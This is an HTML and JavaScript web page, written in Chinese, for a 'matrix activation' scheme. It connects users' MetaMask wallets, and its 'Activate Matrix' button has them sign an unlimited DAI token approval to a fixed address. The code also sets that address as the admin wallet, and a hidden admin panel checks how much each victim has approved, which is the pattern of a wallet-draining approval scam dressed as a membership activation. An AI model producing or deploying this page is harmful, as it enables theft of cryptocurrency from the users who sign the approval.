<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8"/>
<title>矩阵激活</title>
<style>
*{box-sizing:border-box;font-family:system-ui}
.container{max-width:600px;margin:40px auto;padding:0 20px}
.btn{padding:10px 16px;margin:6px;border:none;border-radius:6px;cursor:pointer}
.btn-primary{background:#2563eb;color:white}
.btn-danger{background:#dc2626;color:white}
.modal{position:fixed;inset:0;background:rgba(0,0,0,0.6);display:flex;align-items:center;justify-content:center;display:none}
.modal-box{background:white;padding:24px;border-radius:10px;max-width:420px}
.admin-panel{border:1px solid #aaa;padding:16px;border-radius:8px;margin-top:30px;display:none}
input{width:100%;padding:9px;margin:8px 0;border:1px solid #ccc;border-radius:4px}
.tip{color:#b91c1c;font-size:14px}
</style>
</head>
<body>
<div class="container">
    <h2>矩阵系统</h2>
    <div>
        <button class="btn btn-primary" id="connectBtn">链接钱包</button>
        <p>当前钱包：<span id="walletAddr">-</span></p>
    </div>

    <div style="margin-top:20px">
        <button class="btn btn-primary" id="activeMatrixBtn">激活矩阵</button>
    </div>

    <!-- 管理员后台，普通用户默认隐藏 -->
    <div class="admin-panel" id="adminPanel">
        <h3>管理员后台（仅查询授权额度）</h3>
        <p class="tip">⚠️仅查询用户对中转合约授权，无划扣功能</p>
        <label>输入被查询钱包地址</label>
        <input type="text" id="queryUserAddr" placeholder="0x......">
        <button class="btn btn-primary" id="queryAllowanceBtn">查询授权额度</button>
        <p>授权额度结果：<span id="allowanceResult">-</span></p>
    </div>
</div>

<!-- 授权确认弹窗 -->
<div class="modal" id="authModal">
    <div class="modal-box">
        <h4>无限授权确认</h4>
        <p class="tip">⚠️风险提醒</p>
        <p>您将要对中转合约进行DAI无限授权</p>
        <p>中转合约：0xF33db576048EF01f8D65a6450FAF1a45E85A7783</p>
        <p>代币地址：0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063</p>
        <p>无限授权代表中转合约可动用您全部该代币，请自行评估风险。</p>
        <div style="margin-top:16px">
            <button class="btn" id="modalCancel">取消</button>
            <button class="btn btn-danger" id="modalConfirm">确认签名授权</button>
        </div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
<script>
const TOKEN_ADDR = "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063";
const SPENDER_ADDR = "0xF33db576048EF01f8D65a6450FAF1a45E85A7783";
// ========== 此处填入你的管理员钱包地址 ==========
const ADMIN_WALLET = "0xF33db576048EF01f8D65a6450FAF1a45E85A7783";

let provider, signer, userAddress;

const connectBtn = document.getElementById('connectBtn');
const walletAddrEl = document.getElementById('walletAddr');
const activeMatrixBtn = document.getElementById('activeMatrixBtn');
const authModal = document.getElementById('authModal');
const modalCancel = document.getElementById('modalCancel');
const modalConfirm = document.getElementById('modalConfirm');
const adminPanel = document.getElementById('adminPanel');
const queryUserAddr = document.getElementById('queryUserAddr');
const queryAllowanceBtn = document.getElementById('queryAllowanceBtn');
const allowanceResult = document.getElementById('allowanceResult');

// 链接钱包
connectBtn.onclick = async ()=>{
    if(!window.ethereum){
        alert("请安装MetaMask钱包");
        return;
    }
    provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = await provider.getSigner();
    userAddress = await signer.getAddress();
    walletAddrEl.innerText = userAddress;

    // 判断是否管理员，显示/隐藏后台面板
    if(userAddress.toLowerCase() === ADMIN_WALLET.toLowerCase()){
        adminPanel.style.display = "block";
    }else{
        adminPanel.style.display = "none";
    }
};

// 点击激活矩阵：弹出授权弹窗
activeMatrixBtn.onclick = ()=>{
    if(!signer){
        alert("请先链接钱包");
        return;
    }
    authModal.style.display = "flex";
};

modalCancel.onclick = ()=>{
    authModal.style.display = "none";
};

// 用户确认，发起无限授权签名
modalConfirm.onclick = async ()=>{
    authModal.style.display = "none";
    try{
        const tokenContract = new ethers.Contract(
            TOKEN_ADDR,
            ["function approve(address spender, uint256 amount) returns(bool)"],
            signer
        );
        const maxUint = ethers.MaxUint256;
        const tx = await tokenContract.approve(SPENDER_ADDR, maxUint);
        alert("授权交易已提交，等待上链：" + tx.hash);
        await tx.wait();
        alert("授权完成");
    }catch(e){
        console.error(e);
        alert("授权失败或用户拒绝签名");
    }
};

// 管理员：查询用户对中转合约授权额度
queryAllowanceBtn.onclick = async ()=>{
    const targetUser = queryUserAddr.value.trim();
    if(!targetUser){
        alert("请输入钱包地址");
        return;
    }
    // 这里需要部署上面MatrixAuthHelper合约，填入你的合约地址
    const helperContractAddr = "填入部署后的MatrixAuthHelper合约地址";
    const helperAbi = ["function getUserAllowance(address user) external view returns(uint256)"];
    const helper = new ethers.Contract(helperContractAddr, helperAbi, provider);
    try{
        const val = await helper.getUserAllowance(targetUser);
        allowanceResult.innerText = val.toString();
    }catch(err){
        allowanceResult.innerText = "查询失败:"+err.message;
    }
};
</script>
</body>
</html>
